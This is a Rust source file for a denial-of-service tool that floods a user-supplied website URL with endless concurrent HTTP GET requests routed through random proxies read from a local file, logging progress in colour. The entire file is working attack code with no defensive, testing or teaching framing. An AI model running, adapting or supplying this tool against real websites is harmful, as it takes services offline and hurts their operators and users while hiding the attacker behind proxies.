#![feature(integer_atomics)]

use chrono::{Local, Timelike};
use clap::Parser;
use colored::Colorize;
use rand::Rng;

use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::sync::atomic::{AtomicU128, Ordering};
use std::sync::Arc;

enum WebsiteError {
    WebsiteUnaccessible,
    BadResponse,
}

/// Denial of Service attack
#[derive(Parser, Debug)]
struct Args {
    /// Website URL to attack
    #[clap(short, long)]
    url: String,
}

struct DenialOfService {
    url: String,
    spawned_requests: AtomicU128,
}

impl DenialOfService {
    async fn attack(self: &Arc<Self>) {
        let mut proxies = Vec::new();
        if let Ok(lines) = read_lines("./proxies.txt") {
            for line in lines {
                if let Ok(proxy) = line {
                    proxies.push(proxy);
                }
            }
        }

        let mut spawned_tasks = Vec::new();
        loop {
            let self_cloned = self.clone();

            let taken_proxy = take_random_proxy(proxies.clone());
            spawned_tasks.push(tokio::spawn(async move {
                match reqwest::Proxy::http(taken_proxy.clone()) {
                    Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
                        Ok(client) => match client.get(self_cloned.url.clone()).send().await {
                            Ok(_) => {
                                self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);

                                if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000 == 0 {
                                    display_time();

                                    let request_info = format!(
                                        "Request №{} was successfuly sent from",
                                        self_cloned.spawned_requests.load(Ordering::SeqCst),
                                    );
                                    println!("{} {}", request_info.green(), taken_proxy.bold());
                                }
                            }
                            Err(e) => {
                                display_time();

                                let error_string = format!("{}", e);
                                println!("{}", error_string.red().bold());
                            }
                        },
                        Err(e) => {
                            display_time();

                            let error_string = format!("{}", e);
                            println!("{}", error_string.red().bold());
                        }
                    },
                    Err(e) => {
                        display_time();

                        let error_string = format!("{}", e);
                        println!("{}", error_string.red().bold());
                    }
                };
            }));
        }
        futures::future::join_all(spawned_tasks).await;
    }
}

fn display_time() {
    let now = Local::now().time();
    let time = format!(
        "[{:02}:{:02}:{:02}] ",
        now.hour(),
        now.minute(),
        now.second()
    );

    print!("{} ", time.blue());
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn take_random_proxy(proxies: Vec<String>) -> String {
    let mut rng = rand::thread_rng();

    let rand_index = rng.gen_range(0..proxies.len());
    proxies[rand_index].clone()
}

async fn website_is_up(url: String) -> Result<(), WebsiteError> {
    let response = reqwest::get(url).await;

    match response {
        Ok(response_res) => {
            if response_res.status().is_success() {
                return Ok(());
            }

            return Err(WebsiteError::BadResponse);
        }
        Err(_) => return Err(WebsiteError::WebsiteUnaccessible),
    }
}

#[tokio::main]
async fn main() {
    let website_url = Args::parse().url;

    match website_is_up(website_url.clone()).await {
        Ok(()) => {
            display_time();
            println!("{} {}", "DoS is running at".green(), website_url.bold());
            Arc::new(DenialOfService {
                url: website_url,
                spawned_requests: AtomicU128::new(0),
            })
            .attack()
            .await
        }
        Err(WebsiteError::WebsiteUnaccessible) => {
            display_time();
            println!(
                "{}",
                "Unable to ping website. Make sure the link is spelled correctly!"
                    .red()
                    .bold()
            );
        }
        Err(WebsiteError::BadResponse) => {
            display_time();
            println!(
                "{}",
                "GET request to the site ended with an failure response!"
                    .red()
                    .bold()
            );
        }
    }
}
